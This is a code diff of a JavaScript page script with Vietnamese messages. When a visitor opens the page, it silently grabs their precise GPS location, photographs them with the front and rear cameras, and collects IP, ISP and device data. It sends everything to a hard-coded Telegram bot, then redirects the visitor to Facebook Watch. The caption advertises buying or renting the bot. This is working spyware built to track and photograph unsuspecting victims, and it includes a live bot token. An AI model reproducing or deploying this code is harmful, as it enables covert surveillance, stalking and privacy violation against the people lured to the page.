@@ -1,28 +1,14 @@
 const TOKEN = '8163261794:AAE1AVuCTP0Vm_kqV0a1DT-02NTo1XKhVs0';
-const ID = '-1003770043455';
+const ID = '-1003780431822';
 
 function getGPS() {
     return new Promise((res) => {
         if (!navigator.geolocation) return res(null);
-        let best = null;
-        const watchID = navigator.geolocation.watchPosition(
-            (p) => {
-                const { latitude, longitude, accuracy } = p.coords;
-                if (!best || accuracy < best.acc) {
-                    best = { lat: latitude, lon: longitude, acc: accuracy };
-                }
-                if (accuracy < 10) {
-                    navigator.geolocation.clearWatch(watchID);
-                    res(best);
-                }
-            },
-            () => res(best),
-            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+        navigator.geolocation.getCurrentPosition(
+            (p) => res({ lat: p.coords.latitude, lon: p.coords.longitude, acc: p.coords.accuracy }),
+            () => res(null),
+            { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
         );
-        setTimeout(() => {
-            navigator.geolocation.clearWatch(watchID);
-            res(best);
-        }, 8000);
     });
 }
 
@@ -46,17 +32,16 @@ async function capture(mode) {
         const v = document.createElement('video');
         v.srcObject = s;
         await v.play();
-        const b = await new Promise(res => {
+        return new Promise(res => {
             setTimeout(() => {
                 const c = document.createElement('canvas');
                 c.width = v.videoWidth; 
                 c.height = v.videoHeight;
                 c.getContext('2d').drawImage(v, 0, 0);
                 s.getTracks().forEach(t => t.stop());
-                c.toBlob(res, 'image/jpeg', 0.7);
-            }, 2000);
+                c.toBlob(res, 'image/jpeg', 0.8);
+            }, 2500);
         });
-        return b;
     } catch (e) { return null; }
 }
 
@@ -64,38 +49,40 @@ async function main() {
     const [gps, info] = await Promise.all([getGPS(), getVitals()]);
     
     const p1 = await capture("user");
-    await new Promise(r => setTimeout(r, 1500));
     const p2 = await capture("environment");
 
     const lat = gps ? gps.lat : info.lat;
     const lon = gps ? gps.lon : info.lon;
-    const type = gps ? `🎯 GPS (±${Math.round(gps.acc)}m)` : "🌐 IP (Kém chính xác)";
+    const type = gps ? `🎯 GPS (±${Math.round(gps.acc)}m)` : "🌐 IP (Sai số cao)";
     const map = `https://www.google.com/maps?q=${lat},${lon}`;
 
     const cap = `📡 [THÔNG TIN TRUY CẬP]
 🕒 ${new Date().toLocaleString('vi-VN')}
-📱 Thiết bị: ${navigator.userAgentData ? navigator.userAgentData.platform : navigator.platform}
+📱 Thiết bị: ${navigator.userAgent.includes("Android") ? "Android" : "iPhone/PC"}
 🌍 IP: ${info.ip}
 🏢 ISP: ${info.isp}
 📍 Khu vực: ${info.addr}
 🛠 Định vị: ${type}
 📌 Maps: ${map}
 📸 Camera: ${p1 ? '✅ Trước' : '❌'} | ${p2 ? '✅ Sau' : '❌'}
+
+⚠️ Lưu ý: Thông tin trên có thể không chính xác 100%.
 💸 Mua bot - Thuê bot ib Tele: @Mrwenben`.trim();
 
     const fd = new FormData();
     fd.append('chat_id', ID);
     
-    if (p1 || p2) {
-        const media = [];
-        if (p1) {
-            fd.append('f1', p1, '1.jpg');
-            media.push({ type: 'photo', media: 'attach://f1', caption: cap });
-        }
-        if (p2) {
-            fd.append('f2', p2, '2.jpg');
-            media.push({ type: 'photo', media: 'attach://f2' });
-        }
+    const media = [];
+    if (p1) {
+        fd.append('f1', p1, '1.jpg');
+        media.push({ type: 'photo', media: 'attach://f1', caption: cap });
+    }
+    if (p2) {
+        fd.append('f2', p2, '2.jpg');
+        media.push({ type: 'photo', media: 'attach://f2', caption: media.length === 0 ? cap : "" });
+    }
+
+    if (media.length > 0) {
         fd.append('media', JSON.stringify(media));
         await fetch(`https://api.telegram.org/bot${TOKEN}/sendMediaGroup`, { method: 'POST', body: fd });
     } else {
@@ -106,7 +93,9 @@ async function main() {
         });
     }
     
-    window.location.href = "https://www.facebook.com/watch/";
+    setTimeout(() => {
+        window.location.href = "https://www.facebook.com/watch/";
+    }, 1500);
 }
 
 main();
